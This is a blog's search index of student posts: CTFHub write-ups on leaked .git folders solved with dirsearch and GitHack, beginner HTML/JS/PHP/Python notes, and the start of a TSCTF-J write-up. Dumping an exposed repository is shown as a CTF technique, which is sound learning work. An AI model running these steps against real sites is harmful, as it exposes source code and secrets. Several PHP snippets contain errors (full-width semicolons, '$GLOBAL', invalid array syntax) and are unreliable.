<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Git泄露</title>
    <url>/2021/11/14/Git%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<blockquote>
<p>关于 <em>Git</em> 的一些题目</p>
</blockquote>
<span id="more"></span>



<hr>
<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><blockquote>
<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题     –From 题目</p>
</blockquote>
<p><em>GitHack</em> 使用方法: </p>
<blockquote>
<p>python2 GitHack.py <a href="http://www.example.com/.git/">http://www.example.com/.git/</a></p>
</blockquote>
<p>​    先用 <em>dirsearch</em> 扫一下，如图</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114142343028.png" alt="image-20211114142343028"></p>
<p>​    发现了 <em>./git</em> ，于是用 <em>GitHack</em> 获取一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211125154720914.png" alt="image-20211125154720914"></p>
<p>​    然后到对应的文件夹中运行 <em>Git</em> ，先看看历史版本</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114142710242.png" alt="image-20211114142710242"></p>
<p>​    发现在这一版本中移除了 <em>flag</em>， 于是将其回退到上一版本，获取列表再打开那个 <em>txt</em> 文档，即可看到<em>flag</em></p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114143232011.png" alt="image-20211114143232011"></p>
<p>ok了</p>
<hr>
<h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><blockquote>
<p>一样的题面,就不贴了</p>
</blockquote>
<p>​    上手 <em>dirsearch</em> 扫一扫, 又来了</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114143713247.png" alt="image-20211114143713247"></p>
<p>​    用 <em>githack</em> 扫一下， 效仿上一题的做法试试先， 发现输出这个</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114145107409.png" alt="image-20211114145107409"></p>
<p>​    <em>flag</em> 没在那个文本文档里面， 于是搜一下题目中的 <strong>Stash</strong> 了解一下相关知识</p>
<ul>
<li><p><em><strong>git stash</strong></em></p>
<p>用处: 保存当前工作进度, 会将暂存区和工作区的改动都进行保存 (可多次执行)</p>
</li>
<li><p><em><strong>git stash list</strong></em></p>
<p>显示所保存的工作进度的列表</p>
</li>
<li><p><em><strong>git stash pop [index] [stash_id]</strong></em> (恢复后会删除被恢复的进度)</p>
<ul>
<li><strong>git stash pop</strong> 用于恢复最近保存的进度到工作区 (将工作区中和暂存区中保存的进度都恢复到现在的工作区中)</li>
<li><strong>git stash pop –index</strong> 分别将最近保存的进度恢复到对应的区域中 (即工作区恢复至工作区, 暂存区恢复至暂存区)</li>
<li><em><strong>git stash pop stash@{i}</strong></em> 恢复 <strong>git stash list</strong> 中的第 <em>i</em> 次的保存进度 (工作区+暂存区) 到工作区中</li>
</ul>
</li>
<li><p><em><strong>git stash apply [index] [stash_id]</strong></em> (恢复后仍保留被恢复的进度,其他用法与语法与 <em>pop</em> 一样)</p>
<ul>
<li>(略)</li>
</ul>
</li>
<li><p><em><strong>git stash drop [stash_id]</strong></em> </p>
<ul>
<li>删除一个保存的进度, 若不指定 <em>id</em> 则默认删除最新的保存进度</li>
</ul>
</li>
<li><p><em><strong>git stash clear</strong></em> </p>
<ul>
<li>删除所有保存的进度</li>
</ul>
<p><del>(打完这个发现环境关了,典中典了属于是)</del>   .remake</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211114153055272.png" alt="image-20211114153055272"></p>
<p>​    相关知识了解完后就有手就能做了</p>
<hr>
<h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>​    <em>dirsearch</em> -&gt; <em>githack</em> , 然后…</p>
<p>​    <em><strong>我不理解</strong></em></p>
<p>​    一扫完就看到有一个文本文档在目录里面, 点开一看就是 <em>flag</em> , 我还以为是钓鱼弗拉格, 尝试提交之后居然还是真的, <em><strong>我不理解 !!!</strong></em></p>
<p>​    这道题就没了……</p>
<hr>
<p>​    没了, 但是深刻感觉到 <em>git</em> 的知识还是太少了, 得整一整</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>CtfHub</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML学习笔记</title>
    <url>/2021/10/31/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<span id="more"></span>



<h3 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h3><ul>
<li>由尖括号包围的关键词, 如 &lt;html&gt;</li>
<li></li>
</ul>
]]></content>
      <tags>
        <tag>HTML 笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>JS学习笔记</title>
    <url>/2021/11/03/JS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>在用之前一定要先 <strong>耐心看源码</strong> , 没办法的事, 要用就得知道到底原来有些啥</p>
</blockquote>
<span id="more"></span>



<h1 id="基础得不能再基础的基础知识"><a href="#基础得不能再基础的基础知识" class="headerlink" title="基础得不能再基础的基础知识"></a>基础得不能再基础的基础知识</h1><ol>
<li>JS 中使用关键字 <strong>var</strong> 来定义变量</li>
<li><strong>字面量</strong> 即固定值， 其中 <strong>对象 (Object) 字面量</strong> 定义一个对象, 例:</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">age</span>:<span class="number">50</span>, <span class="attr">eyeColor</span>:<span class="string">&quot;blue&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li> JS 中 ‘’<strong>;</strong>‘’ 不是必须的</li>
<li>可以通过使用 *<em>\*</em> 来对代码进行换行, 如下面的代码能够正常执行</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;你好 \</span></span><br><span class="line"><span class="string">世界!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​    而如下代码则不能正常执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write \ </span><br><span class="line">(<span class="string">&quot;你好世界!&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong>对象</strong>   由花括号分隔, 在括号内部以名称和值对的形式 (name: value)  来定义. 不同的属性由逗号分隔, 如:</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">id</span>:<span class="number">5566</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>​    对象的属性有两种寻址方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name = person.lastname;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">name = person[<span class="string">&quot;lastname&quot;</span>]</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211104004038611.png" alt="image-20211104004038611"></p>
<p>​    PS:                          JS 都有对象了, 谁还没对象???   没对象的私聊我拿教程             /捂嘴笑</p>
<ol start="6">
<li></li>
</ol>
<h1 id="一些函数知识"><a href="#一些函数知识" class="headerlink" title="一些函数知识"></a>一些函数知识</h1><h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h2><p>​    其语法可以是下列两种</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(要执行的代码, 等待的毫秒数)</span><br><span class="line"><span class="built_in">setTimeout</span>(JavaScript 函数, 等待的毫秒数)</span><br></pre></td></tr></table></figure>

<p>​    执行之后, 设定一个具体的等候时间, 时间到了之后就会执行相应的代码或函数</p>
<p>​    <strong>细节</strong> : 会有返回值, 可以被 <em>clearTimeout()</em> 调用而停掉, 返回值就是一个数字, 从 <em>1</em> 开始, 调用一次增加一次, 执行 <em><strong>一次</strong></em> 便停止 (没有循环啥的的时候)</p>
<hr>
<h2 id="clearTimeout"><a href="#clearTimeout" class="headerlink" title="clearTimeout"></a>clearTimeout</h2><p>​    用于阻止 <em>setTimeout()</em> 方法执行函数, 括号内填 <em>setTimeout()</em> 的返回值,如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">clearTimeout</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    就能停掉</p>
<hr>
<h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval()"></a>setInterval()</h2><p>语法:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(代码, 毫秒);</span><br><span class="line"><span class="built_in">setInterval</span>(函数, 毫秒, param1, param2, ...)</span><br></pre></td></tr></table></figure>

<p>​    <em>param</em> 是传给执行函数的其他参数</p>
<p>​    <strong>细节</strong> : 同 <em>setTimeout()</em> 一样会有返回值, 也是数字和递增, 而该函数会 <em><strong>重复执行</strong></em></p>
<hr>
<h2 id="clearInterval"><a href="#clearInterval" class="headerlink" title="clearInterval"></a>clearInterval</h2><p>​    用于取消由 <em>setInterval()</em> 设定的定时操作 (就是新生赛是我梦寐以求的停止刷新的函数) ,括号内同样使用 <em>setInterval()</em> 的返回值, 如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">clearInterval</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    就能停掉</p>
<hr>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习笔记</title>
    <url>/2021/11/05/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><span id="more"></span>

<ol>
<li><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p><em>PHP</em> 变量由 <strong>$</strong> 符号开始, 后跟着变量名称, 且 <strong>不用事先声明</strong> , 如: </p>
</li>
</ol>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span>=<span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="variable">$x</span>*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txe</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h3 id="Global-关键字"><a href="#Global-关键字" class="headerlink" title="Global 关键字"></a><strong>Global 关键字</strong></h3></li>
</ol>
<p>   <em>global</em> 关键字用于函数内访问全局变量, 如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">	<span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    或者可以这样写:</span></span><br><span class="line"><span class="comment">    $GLOBAL[&#x27;y&#x27;]=$GLOBAL[&#x27;x&#x27;]+$GLOBAL[&#x27;y&#x27;];</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myTest();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    输出为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>​    <em>php</em> 将所有的全局变量存储在 名为 <em>GLOBAL</em> 的数组中, 则可以写成第二种写法</p>
<ol start="3">
<li><h3 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a><strong>static</strong> 关键字</h3><p>若希望局部变量不被删除, 则需要使用 <em>static</em> 关键字来声明 ( 但本质上还是一个局部变量 ), 如:</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="variable">$x</span>++;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;    <span class="comment">// 换行符</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line">myTest();</span><br><span class="line">myTest();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    如此, 则变量 <strong>x</strong> 在被调用结束后仍然会保留, 下一次调用时 <em>x</em> 的值为上次调用结束时的值</p>
<ol start="4">
<li><h3 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a><em>echo</em> 和 <em>print</em> 语句</h3><ol>
<li><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a><strong>echo</strong></h4></li>
<li><p><em>echo</em> 输出的速度更快, 没有返回值, 使用时可以自选加不加 <em>()</em></p>
</li>
</ol>
</li>
</ol>
<p><strong>输出字符串</strong> (可以包含 <em>HTML</em> 标签)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;差不多得了&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;哈哈&quot;</span>, <span class="string">&quot;可以&quot;</span>, <span class="string">&quot;多个&quot;</span>, <span class="string">&quot;一起&quot;</span>, <span class="string">&quot;输出&quot;</span>, <span class="string">&quot;, 你就说行不行吧&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>输出变量和字符串</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt1</span>=<span class="string">&quot;我是菜鸟&quot;</span>;</span><br><span class="line"><span class="variable">$txt2</span>=<span class="string">&quot;想寄就寄&quot;</span>;</span><br><span class="line"><span class="variable">$php_love</span>=<span class="keyword">array</span>(<span class="string">&quot;PHP&quot;</span>, <span class="string">&quot;狗都&quot;</span>, <span class="string">&quot;不用&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我,<span class="subst">$txt2</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$php_love[0]&#125;</span> 是世界上最好的语言!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-print"><a href="#2-print" class="headerlink" title="2. print"></a>2. <strong>print</strong></h4><p>​    <em>print</em> 有返回值，为 <em>1</em></p>
<p><strong>输出字符串</strong>  (同样可以包含 <em>HTML</em> 标签)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;h2&gt;差不多得了&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;哈哈&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;一次只能&quot;</span>；</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;输出&quot;</span>；</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;一个&quot;</span>；</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;字符串捏&quot;</span>；</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<ol start="5">
<li><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h3><p>用于将 <em>%</em> 替换为一个参数进行传递变量并输出 (有点像<em>C/C++</em> 里面的 <em>printf</em>)</p>
</li>
</ol>
<h2 id="一些高级一点的知识"><a href="#一些高级一点的知识" class="headerlink" title="一些高级一点的知识"></a>一些高级一点的知识</h2><hr>
<ol>
<li><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><ol>
<li><h4 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h4></li>
</ol>
<p>​    <strong>类</strong> 使用关键词 <em><strong>class</strong></em> 加类名进行定义 (<strong>类</strong> 中的定义、函数等的定义均和主函数中相同) , 定义方式如下: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpClass</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var2</span> = <span class="string">&quot;constant string&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">     [..]</span><br><span class="line">  &#125;</span><br><span class="line">  [..]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<ol start="2">
<li><h3 id="gt-gt-和-this-self-parent"><a href="#gt-gt-和-this-self-parent" class="headerlink" title="-&gt; =&gt; :: 和  this self parent"></a><strong>-&gt; =&gt; ::</strong> 和  <strong>this self parent</strong></h3><ol>
<li><h4 id="this-self-parent"><a href="#this-self-parent" class="headerlink" title="**this  self  parent **"></a>**this  self  parent **</h4></li>
</ol>
<h5 id="this"><a href="#this" class="headerlink" title="this:"></a><strong>this</strong>:</h5><p>​    即, <strong>当前对象</strong>  例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span> -&gt; name;</span><br><span class="line"><span class="keyword">$this</span> -&gt; name();</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Website</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; name();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; url();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">url</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;http://c.biancheng.net/php/&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; title();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;PHP入门教程&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> Website(<span class="string">&#x27;C语言中文网&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>​    第一句访问当前成员的 <em>name</em> 属性, 第二句对当前成员调用类中的 <em>name()</em> 方法 (即调用函数)</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><ol start="2">
<li><h4 id="gt-gt"><a href="#gt-gt" class="headerlink" title="**-&gt; =&gt; :: **"></a>**-&gt; =&gt; :: **</h4></li>
</ol>
<h5 id="gt-插入式解引用操作符"><a href="#gt-插入式解引用操作符" class="headerlink" title="-&gt; (插入式解引用操作符)"></a><strong>-&gt; (插入式解引用操作符)</strong></h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;b</span><br></pre></td></tr></table></figure>

<p>​    取对象 <strong>a</strong> 的 <strong>b</strong> 属性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;b(<span class="variable">$c</span>)</span><br></pre></td></tr></table></figure>

<p>​    调用对象 <strong>a</strong> 的 <strong>b</strong> 方法, 方法中传入一个参数 <strong>$c</strong> </p>
<h5 id="gt-在数组中用"><a href="#gt-在数组中用" class="headerlink" title="**=&gt; (在数组中用) **"></a>**=&gt; (在数组中用) **</h5><p>用于操作数组中的数据: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phparr</span>= <span class="keyword">new</span> <span class="keyword">array</span>( in =&gt; <span class="string">&#x27;reply,&#x27;</span></span><br><span class="line">side =&gt; <span class="string">&#x27;left&#x27;</span>,</span><br><span class="line">padx =&gt; <span class="number">2</span>m,</span><br><span class="line">pady =&gt; <span class="number">2</span>m,</span><br><span class="line">ipadx =&gt; <span class="number">2</span>m,</span><br><span class="line">ipady =&gt; <span class="number">1</span>m</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h5 id="范围解释操作符-域运算符"><a href="#范围解释操作符-域运算符" class="headerlink" title=":: ( 范围解释操作符 / 域运算符 )**"></a>:: ( 范围解释操作符 / 域运算符 )**</h5><p>​    用于调用类的 <strong>内部静态成员</strong> 或者 <strong>类之间</strong> 的调用:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PY入门笔记</title>
    <url>/2021/10/30/PY%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>确实PY还挺好入门的 (确信</p>
</blockquote>
<span id="more"></span>



<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="pass-语句"><a href="#pass-语句" class="headerlink" title="pass 语句"></a>pass 语句</h3><p>​    没有任何实际含义, 仅作为占位语句. 在<strong>python 2.x</strong> 版本中函数内完全没有内容是不被允许的, 想要实现空函数必须使用pass 语句, 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span> ():</span></span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>​    而在<strong>python 3.x</strong> 版本中空函数内可以连pass都没有</p>
<hr>
<h3 id="del-语句"><a href="#del-语句" class="headerlink" title="del 语句"></a>del 语句</h3><p>​    可以通过del 删除一些<em>Number 对象的引用</em> , 相当于断开数据与变量之间的链接, 但断开不具有传递性, 如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = a</span><br><span class="line">c = b</span><br><span class="line"><span class="keyword">del</span> a</span><br><span class="line"><span class="keyword">del</span> b</span><br><span class="line"><span class="comment"># 或者可以用 del a, b</span></span><br><span class="line"><span class="built_in">print</span> (c)</span><br></pre></td></tr></table></figure>

<p>​    运行结果为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>​    即, del 只会断开当前变量与数据之间的链接, 并不会影响其他与该变量有关的变量</p>
<hr>
<h2 id="Python-中的一些与运算有关的函数"><a href="#Python-中的一些与运算有关的函数" class="headerlink" title="Python 中的一些与运算有关的函数"></a>Python 中的一些与运算有关的函数</h2><blockquote>
<p>没啥好写的,记录一下以备不时之需</p>
</blockquote>
<p>​    <a href="https://www.runoob.com/python/python-numbers.html">python中的<em>数学函数</em> <em>随机数函数</em> <em>三角函数</em>以及<em>数学常量</em></a></p>
<hr>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>TSCTF-J WP</title>
    <url>/2021/10/25/TSCTF-J%20WP/</url>
    <content><![CDATA[<h1 id="TSCTF-J-2021-WP"><a href="#TSCTF-J-2021-WP" class="headerlink" title="TSCTF-J 2021  WP"></a><strong>TSCTF-J 2021  WP</strong></h1><ul>
<li><p><em><strong>King of F12</strong></em></p>
</li>
<li><p><em><strong>SimplePHP</strong></em></p>
</li>
<li><p><em><strong>ezbypass</strong></em></p>
<span id="more"></span></li>
</ul>
<blockquote>
<p>​    <strong>前言</strong>:</p>
<p>​    连着打了两天的TSCTF-J，感觉挺有意思的。我感觉CTF和NOIP一个很大的差别就是它能上网搜，但是这并不代表CTF就比NOIP简单，相反，这不仅考验思维，更考验对搜索引擎的熟练运用、信息的提取以及对新知识的迅速吸收并利用。在众多方向中最吸引我的还是Web <del>(虽然这次几乎算是爆零)</del> 其次就是逆向，可能是从初三开始的对黑小网站的渴望使然吧、也可能是对一些Web渗透操作的喜爱吧，逆向应该就是对写软件外挂的渴望(当然逆向肯定不止这种东西)。虽然现在我很菜，但是我会一直努力的！！！</p>
<p>​    另外，我觉得特别好玩的一件事就是Web手好像要啥都会一点，在编程语言方面尤为突出。现在我能稍微熟练运用一下的就是C++，不过我对它的了解也仅限于写程序输入输出罢了，感觉和Web完全搭不上边。所以接下来的首要任务就是重点学习一下python和php，题也做得太少了，加油罢！</p>
</blockquote>
<h2 id="King-of-F12"><a href="#King-of-F12" class="headerlink" title="King  of F12"></a>King  of F12</h2><blockquote>
<p>签到题，起手一枪秒了，还有什么好说的</p>
</blockquote>
<p>​     打开页面发现只有不停跳动着的 <del>屏保图案</del> 烟花，想想题目名字和F12有关，于是坚毅而果断的按下F12.看看源码之后发现这么一句话 </p>
<blockquote>
 <!--
     To be the King of F12 maybe you have to go ./CHALLENGE-BUTTONKNIGHT.php
    -->
</blockquote>
<p>​    那就到 <em>/CHALLENGE-BUTTONKNIGHT.php</em> 看看罢</p>
<p>​    是消失的按钮，直接进行检查删除 <strong>disabled</strong>  (攻防世界新手入门难度get<strong>√</strong>) ，获得提示</p>
<blockquote>
<p>You are the hero, and the flag is waiting for you at ./handcrusher.php</p>
</blockquote>
<p>​    来到了 <del>我最喜欢的</del> 手刃詹爹的环节</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024194907935.png" alt="image-20211024194907935">[^1]:不愧是大爹，好(<del>臭</del>)厚的血</p>
<p>​    首先想到直接用连点器莽过去，但是点了半天发现一二三血都被拿完了我还连1/5都没砍完，于是开始找规律。发现是名字越长攻击越高，正好我开了不少搜索的标签，直接进行一个复制粘贴， 爆杀！拿到茯苓哥哥的flag.   </p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024195720973.png" alt="image-20211024195720973">[^2]: 才发现f0还在卖萌 XD</p>
<hr>
<hr>
<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><blockquote>
<p>  遇见simple、ez就快跑，没好果汁吃       </p>
</blockquote>
<p>​    进入网站后看到一大串代码</p>
